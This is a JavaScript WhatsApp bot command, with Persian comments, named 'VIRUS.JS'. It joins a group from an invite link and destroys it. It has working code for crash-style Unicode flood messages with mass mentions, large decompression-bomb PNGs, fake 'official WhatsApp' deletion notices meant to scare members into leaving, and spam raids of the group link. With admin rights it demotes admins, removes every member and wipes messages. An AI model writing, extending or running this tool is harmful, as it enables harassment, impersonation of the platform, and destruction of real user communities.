// =======================
// VIRUS.JS — نابودگر گروه با لینک دعوت
//
//   !virus <لینک>                  → پیوستن + حمله خودکار (ادمین → مسیر کامل، عضو → NUKE)
//   !virus <لینک> nuke             → اجبار مسیر بدون ادمین
//   !virus <لینک> flood <n>        → فقط فلاد سنگین با منشن همه
//   !virus <لینک> media <n>        → فلاد تصویر بمب (PNG بزرگ)
//   !virus <لینک> exodus <n>       → کمپین اعلان جعلی «حذف گروه» (فراری دادن اعضا)
//   !virus <لینک> raid <n>         → پخش لینک گروه در n گروه دیگرِ بات
//   !virus <لینک> status           → پیوستن و گزارش وضعیت (بدون حمله)
//   !virus stop                    → توقف فوری همه حلقه‌ها
// =======================

import zlib from "zlib";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
let STOP = false;

const isAdmin = (p) => p.admin === "admin" || p.admin === "superadmin";

// ---------- استخراج کد دعوت از لینک ----------
function extractCode(text) {
  const m = String(text).match(/chat\.whatsapp\.com\/([A-Za-z0-9_\-]+)/);
  return m ? m[1] : null;
}

// ---------- پیلودهای متنی ----------
const floodTexts = [
  () => "\u200B".repeat(3500) + "⚫",
  () => "⚫\u200B".repeat(1000),
  () => "لَا إِلَٰهَ إِلَّا اللَّهُ" + "\u0651\u064E\u064F\u0650\u0652".repeat(1800),
  () => "👨\u200D👩\u200D👧\u200D👦".repeat(300),
  () => "ༀ".repeat(1500),
  () => "\u202E" + "!ینامزاس یسررب".repeat(120),
];

// ---------- اعلان‌های جعلی رسمی ----------
const exodusMessages = [
  "⚠️ اعلان رسمی واتساپ:\nاین گروه به دلیل نقض قوانین علامت‌گذاری شده و به‌زودی حذف می‌شود.\nبرای حفظ اطلاعات خود همین حالا خارج شوید: اطلاعات گروه ← خروج از گروه",
  "🚨 هشدار امنیتی:\nاعضای باقی‌مانده در این گروه ممکن است حسابشان محدود شود.\nتنها راه نجات، ترک گروه است.",
  "❌ این گروه دیگر معتبر نیست.\nمدیریت آن به سیستم منتقل شده و در حال حذف است.\nلطفاً هرچه سریع‌تر خارج شوید.",
  "💣 گروه شناسایی شد: محتوای غیرمجاز.\nواتساپ به‌زودی این گروه را حذف خواهد کرد.\nترک گروه برای همه الزامی است.",
];

// ---------- ساخت PNG بمب (اصلاح‌شده — بدون باگ بافر) ----------
const CRC_TABLE = (() => {
  const t = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xEDB88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c >>> 0;
  }
  return t;
})();
const crc32 = (buf) => {
  let c = 0xFFFFFFFF;
  for (let i = 0; i < buf.length; i++) c = CRC_TABLE[(c ^ buf[i]) & 0xFF] ^ (c >>> 8);
  return (c ^ 0xFFFFFFFF) >>> 0;
};
const chunk = (type, data) => {
  const t = Buffer.from(type);
  const out = Buffer.alloc(12 + data.length); // ✅ 4 CRC اضافه شد
  out.writeUInt32BE(data.length, 0);
  t.copy(out, 4);
  data.copy(out, 8);
  out.writeUInt32BE(crc32(Buffer.concat([t, data])), 8 + data.length);
  return out;
};

function makeBombPng(w, h, rgb) {
  return new Promise((resolve, reject) => {
    const row = Buffer.alloc(1 + w * 3);
    for (let x = 0; x < w; x++) {
      row[1 + x * 3] = rgb[0];
      row[1 + x * 3 + 1] = rgb[1];
      row[1 + x * 3 + 2] = rgb[2];
    }
    const d = new zlib.Deflate({ level: 9 });
    const out = [];
    d.on("data", (c) => out.push(c));
    d.on("error", reject);
    d.on("end", () => {
      try {
        const ihdr = Buffer.alloc(13);
        ihdr.writeUInt32BE(w, 0);
        ihdr.writeUInt32BE(h, 4);
        ihdr[8] = 8;
        ihdr[9] = 2;
        const sig = Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]);
        resolve(Buffer.concat([sig, chunk("IHDR", ihdr), chunk("IDAT", Buffer.concat(out)), chunk("IEND", Buffer.alloc(0))]));
      } catch (e) { reject(e); }
    });
    (function push(y) {
      if (y >= h) return d.end();
      const up = Math.min(y + 200, h);
      for (; y < up; y++) d.write(row);
      setImmediate(() => push(y));
    })(0);
  });
}

const pngCache = new Map();
const getPng = async (w, h, c) => {
  const k = `${w}x${h}#${c.join(",")}`;
  if (!pngCache.has(k)) {
    console.log("VIRUS: ساخت PNG بمب", w, "x", h);
    pngCache.set(k, await makeBombPng(w, h, c));
  }
  return pngCache.get(k);
};

// ---------- WAV ----------
function makeWav(seconds, sampleRate = 8000) {
  const n = sampleRate * seconds;
  const data = Buffer.alloc(n * 2);
  const hdr = Buffer.alloc(44);
  hdr.write("RIFF", 0); hdr.writeUInt32LE(36 + data.length, 4); hdr.write("WAVE", 8);
  hdr.write("fmt ", 12); hdr.writeUInt32LE(16, 16); hdr.writeUInt16LE(1, 20);
  hdr.writeUInt16LE(1, 22); hdr.writeUInt32LE(sampleRate, 24);
  hdr.writeUInt32LE(sampleRate * 2, 28); hdr.writeUInt16LE(2, 32); hdr.writeUInt16LE(16, 34);
  hdr.write("data", 36); hdr.writeUInt32LE(data.length, 40);
  return Buffer.concat([hdr, data]);
}

// ---------- بمب‌های ظاهری ----------
const subjectBomb = () =>
  "💀\u202E" + "\u200B".repeat(200) + "👨\u200D👩\u200D👧\u200D👦".repeat(15) +
  "⚫\u200B".repeat(40) + "\uFE0F".repeat(50);
const descriptionBomb = () =>
  "\u200B".repeat(15000) + "\n⚠️ این گروه غیرفعال شده است ⚠️\n" + "\u202E".repeat(2000) + "\u0651\u064E\u0650".repeat(2000);

// ---------- ابزارها ----------
async function getInviteLink(sock, jid) {
  try {
    const code = await sock.groupInviteCode(jid);
    return `https://chat.whatsapp.com/${code}`;
  } catch (e) { return null; }
}

async function mentionFlood(sock, jid, count) {
  let meta;
  try { meta = await sock.groupMetadata(jid); } catch (e) { return 0; }
  const ids = meta.participants.map((p) => p.id);
  let ok = 0;
  for (let i = 0; i < count; i++) {
    if (STOP) break;
    try {
      await sock.sendMessage(jid, {
        text: floodTexts[i % floodTexts.length]() + "\n@all",
        mentions: ids,
      });
      ok++;
    } catch (e) { console.log("FLOOD:", e.message); }
    await sleep(150);
  }
  return ok;
}

async function mediaFlood(sock, jid, count) {
  let ok = 0;
  for (let i = 0; i < count; i++) {
    if (STOP) break;
    const img = await getPng(8000, 8000, [255, 0, 0]);
    if (await sock.sendMessage(jid, { image: img, caption: "b" + i, mimetype: "image/png" }).catch(() => null)) ok++;
    await sleep(700);
  }
  return ok;
}

async function voiceFlood(sock, jid, count) {
  const wav = makeWav(8);
  let ok = 0;
  for (let i = 0; i < count; i++) {
    if (STOP) break;
    if (await sock.sendMessage(jid, { audio: wav, mimetype: "audio/wav", ptt: true }).catch(() => null)) ok++;
    await sleep(300);
  }
  return ok;
}

async function locFlood(sock, jid, count) {
  let ok = 0;
  for (let i = 0; i < count; i++) {
    if (STOP) break;
    if (await sock.sendMessage(jid, {
      location: { degreesLatitude: 31.5 + i * 0.001, degreesLongitude: 63.3 + i * 0.001 },
    }).catch(() => null)) ok++;
    await sleep(250);
  }
  return ok;
}

// رید: پخش لینک گروه در گروه‌های دیگر بات
async function linkRaid(sock, targetJid, link, limit) {
  let groups = {};
  try { groups = await sock.groupFetchAllParticipating(); } catch (e) { return 0; }
  const ids = Object.keys(groups).filter((id) => id !== targetJid);
  let ok = 0;
  for (let i = 0; i < ids.length && ok < limit; i++) {
    if (STOP) break;
    try {
      await sock.sendMessage(ids[i], { text: `⚠️\n\n💥 گروه جدید: ${link}` });
      ok++;
    } catch (e) { console.log("RAID:", e.message); }
    await sleep(400);
  }
  return ok;
}

// کمپین اعلان جعلی
async function exodusCampaign(sock, jid, rounds, intervalSec) {
  let meta;
  try { meta = await sock.groupMetadata(jid); } catch (e) { return 0; }
  const ids = meta.participants.map((p) => p.id);
  let ok = 0;
  for (let i = 0; i < rounds; i++) {
    if (STOP) break;
    try {
      await sock.sendMessage(jid, {
        text: exodusMessages[i % exodusMessages.length] + "\n\n@all",
        mentions: ids,
      });
      ok++;
    } catch (e) { console.log("EXODUS:", e.message); }
    await sleep(intervalSec * 1000);
  }
  return ok;
}

// نظارت بر خالی شدن → انحلال واقعی
async function monitorDissolve(sock, jid, maxMs) {
  const botId = sock.user?.id?.split(":")[0] || "";
  const start = Date.now();
  while (Date.now() - start < maxMs) {
    if (STOP) return false;
    try {
      const meta = await sock.groupMetadata(jid);
      const others = meta.participants.filter((p) => p.id.split("@")[0] !== botId);
      if (others.length === 0) {
        await sleep(1000);
        await sock.groupLeave(jid);
        return true;
      }
    } catch (e) {
      return false;
    }
    await sleep(15000);
  }
  return false;
}

// مسیر بدون ادمین (NUKE)
async function nuke(sock, jid) {
  const log = [];
  const f = await mentionFlood(sock, jid, 40);
  log.push(`🔥 ${f} پیام سنگین`);

  const link = await getInviteLink(sock, jid);
  if (link) {
    const raided = await linkRaid(sock, jid, link, 5);
    log.push(`📢 لینک گروه به ${raided} گروه دیگر پخش شد`);
  } else {
    log.push("❌ لینک در دسترس نیست");
  }

  const e = await exodusCampaign(sock, jid, 3, 20);
  log.push(`🗣 ${e} اعلان جعلی «حذف گروه» ارسال شد`);

  await sock.sendMessage(jid, { text: "🛰 نظارت بر گروه فعال شد (۵ دقیقه)...\nاگر همه خارج شوند، گروه منحل می‌شود." });
  const dissolved = await monitorDissolve(sock, jid, 5 * 60 * 1000);
  log.push(dissolved ? "💥 گروه منحل شد" : "⏳ اعضا خارج نشدند");

  return log;
}

// ابزارهای مسیر ادمین
async function lockGroup(sock, jid) {
  const out = {};
  try { await sock.groupSettingUpdate(jid, "announcement"); out.chat = true; } catch (e) { out.chat = false; }
  try { await sock.groupSettingUpdate(jid, "locked"); out.info = true; } catch (e) { out.info = false; }
  return out;
}

async function wipeMessages(sock, jid, limit) {
  let deleted = 0, errors = 0;
  let msgs = [];
  try { msgs = await sock.loadMessages(jid, limit); } catch (e) { return 0; }
  for (const msg of msgs) {
    if (STOP) break;
    const key = msg.key;
    if (!key || key.remoteJid !== jid) continue;
    try {
      await sock.sendMessage(jid, {
        delete: { remoteJid: jid, fromMe: key.fromMe, id: key.id, participant: key.participant },
      });
      deleted++;
      await sleep(250);
    } catch (e) { if (++errors > 10) break; }
  }
  return deleted;
}

async function demoteAll(sock, jid, meta, botId) {
  const admins = meta.participants.filter((p) => isAdmin(p) && p.id.split("@")[0] !== botId);
  let ok = 0;
  for (let i = 0; i < admins.length; i += 5) {
    if (STOP) break;
    try {
      await sock.groupParticipantsUpdate(jid, admins.slice(i, i + 5).map((p) => p.id), "demote");
      ok += Math.min(5, admins.length - i);
    } catch (e) {}
    await sleep(500);
  }
  return ok;
}

async function removeMembers(sock, jid, meta, botId, limit) {
  const members = meta.participants.filter((p) => p.id.split("@")[0] !== botId);
  let removed = 0, errors = 0;
  for (let i = 0; i < members.length && removed < limit; i++) {
    if (STOP) break;
    try {
      await sock.groupParticipantsUpdate(jid, [members[i].id], "remove");
      removed++;
      await sleep(650);
    } catch (e) { if (++errors > 5) break; }
  }
  return removed;
}

async function revokeLoop(sock, jid, rounds) {
  let ok = 0;
  for (let i = 0; i < rounds; i++) {
    if (STOP) break;
    try { await sock.groupRevokeInvite(jid); ok++; } catch (e) {}
    await sleep(800);
  }
  return ok;
}

async function iconBomb(sock, jid) {
  try {
    await sock.updateProfilePicture(jid, await getPng(512, 512, [255, 0, 0]));
    return true;
  } catch (e) { return false; }
}

// مسیر کامل ادمین
async function adminDestroy(sock, jid, meta) {
  const botId = sock.user?.id?.split(":")[0] || "";
  const bot = meta.participants.find((p) => p.id.split("@")[0] === botId);
  const botIsCreator = bot?.admin === "superadmin";
  const log = [];

  const l = await lockGroup(sock, jid);
  log.push(`🔒 قفل: چت=${l.chat ? "✅" : "❌"} اطلاعات=${l.info ? "✅" : "❌"}`);

  try {
    await sock.groupUpdateSubject(jid, subjectBomb());
    await sock.groupUpdateDescription(jid, descriptionBomb());
    await iconBomb(sock, jid);
    log.push("💣 نام + توضیح + آیکون بمب‌گذاری شد");
  } catch (e) {}

  const w = await wipeMessages(sock, jid, 30);
  log.push(`🧹 ${w} پیام اخیر حذف شد`);

  const f = await mentionFlood(sock, jid, 25);
  log.push(`🔥 ${f} پیام سنگین`);

  if (botIsCreator) {
    const d = await demoteAll(sock, jid, meta, botId);
    log.push(`🗡 ${d} ادمین دموت شد`);
  } else {
    log.push("⚠️ دموت ممکن نیست (بات سازنده نیست)");
  }

  const rv = await revokeLoop(sock, jid, 3);
  log.push(`🔁 لینک دعوت ${rv} بار باطل شد`);

  const r = await removeMembers(sock, jid, meta, botId, 100000);
  log.push(`🗑 ${r} عضو حذف شد`);

  await sock.sendMessage(jid, { text: log.join("\n") + "\n\n💥 گروه در حال انحلال است" });
  await sleep(1500);
  try { await sock.groupLeave(jid); } catch (e) {}

  return log;
}

// مسیر خودکار
async function autoDestroy(sock, jid, meta) {
  const botId = sock.user?.id?.split(":")[0] || "";
  const bot = meta.participants.find((p) => p.id.split("@")[0] === botId);
  const botIsAdmin = bot && isAdmin(bot);
  if (botIsAdmin) return adminDestroy(sock, jid, meta);
  return nuke(sock, jid);
}

// ---------- هندلر ----------
export default async function virus(sock, from, body, m, args) {
  try {
    STOP = false;

    if ((args[0] || "").toLowerCase() === "stop") {
      STOP = true;
      await sock.sendMessage(from, { text: "🛑 همه حلقه‌ها متوقف شد." });
      return;
    }

    // پیدا کردن لینک در پیام
    const code = extractCode(body);
    if (!code) {
      await sock.sendMessage(from, {
        text: "❌ لینک گروه پیدا نشد.\nاستفاده: !virus https://chat.whatsapp.com/CODE\n" +
              "حالت‌ها: nuke | flood | media | exodus | raid | status",
      });
      return;
    }

    // حالت‌های غیر از لینک
    const mode = (args.find((a) => !a.includes("chat.whatsapp.com") && !/^\d+$/.test(a)) || "auto").toLowerCase();
    const getN = (def, max) => {
      const v = parseInt(args.find((a) => /^\d+$/.test(a)));
      return Math.min(Number.isFinite(v) ? v : def, max);
    };

    // اطلاعات گروه بدون پیوستن (چک لینک)
    let info = null;
    try { info = await sock.groupGetInviteInfo(code); } catch (e) {
      await sock.sendMessage(from, { text: `❌ لینک معتبر نیست یا بات از این گروه بن شده: ${e.message}` });
      return;
    }

    await sock.sendMessage(from, {
      text: `🔍 اطلاعات گروه:\nنام: ${info.subject}\nاعضا: ${info.size || "?"}\n\n🛰 در حال پیوستن...`,
    });

    // پیوستن به گروه
    let jid;
    try {
      jid = await sock.groupAcceptInvite(code);
    } catch (e) {
      await sock.sendMessage(from, {
        text: `❌ پیوستن ناموفق بود: ${e.message}\n(اگر گروه «تأیید ادمین برای ورود» داشته باشد، باید ادمین تأیید کند)`,
      });
      return;
    }

    const meta = await sock.groupMetadata(jid).catch(() => null);
    if (!meta) {
      await sock.sendMessage(from, { text: "❌ پس از پیوستن، دسترسی به اطلاعات گروه نشد." });
      return;
    }

    await sock.sendMessage(from, {
      text: `✅ وارد گروه شد: ${meta.subject}\nاعضا: ${meta.participants.length}\n` +
            `نقش بات: ${meta.participants.some(isAdmin) ? "ادمین 🗡" : "عضو عادی 🧨"}\n\n💥 شروع حمله...`,
    });

    if (mode === "status") {
      await sock.sendMessage(from, { text: `📊 ${meta.subject}: ${meta.participants.length} عضو. حمله‌ای انجام نشد.` });
      return;
    }

    let log;
    switch (mode) {
      case "nuke":
        log = await nuke(sock, jid);
        break;
      case "flood": {
        const n = await mentionFlood(sock, jid, getN(100, 200));
        log = [`🔥 ${n} پیام سنگین ارسال شد`];
        break;
      }
      case "media": {
        const n = await mediaFlood(sock, jid, getN(3, 6));
        log = [`🖼 ${n} تصویر بمب ارسال شد`];
        break;
      }
      case "exodus": {
        const n = await exodusCampaign(sock, jid, getN(3, 8), 20);
        log = [`🗣 ${n} اعلان جعلی ارسال شد`];
        break;
      }
      case "raid": {
        const link = await getInviteLink(sock, jid);
        const n = link ? await linkRaid(sock, jid, link, getN(5, 15)) : 0;
        log = [link ? `📢 لینک در ${n} گروه دیگر پخش شد` : "❌ لینک در دسترس نیست"];
        break;
      }
      default:
        log = await autoDestroy(sock, jid, meta);
    }

    // گزارش نهایی به اپراتور (گروه ممکن است منحل شده باشد)
    try {
      await sock.sendMessage(from, { text: "💥 گزارش حمله:\n" + log.join("\n") });
    } catch (e) { console.log("REPORT:", e.message); }
  } catch (e) {
    console.log("VIRUS ERROR:", e.message);
    try { await sock.sendMessage(from, { text: `❌ خطا: ${e.message}` }); } catch (e2) {}
  }
}
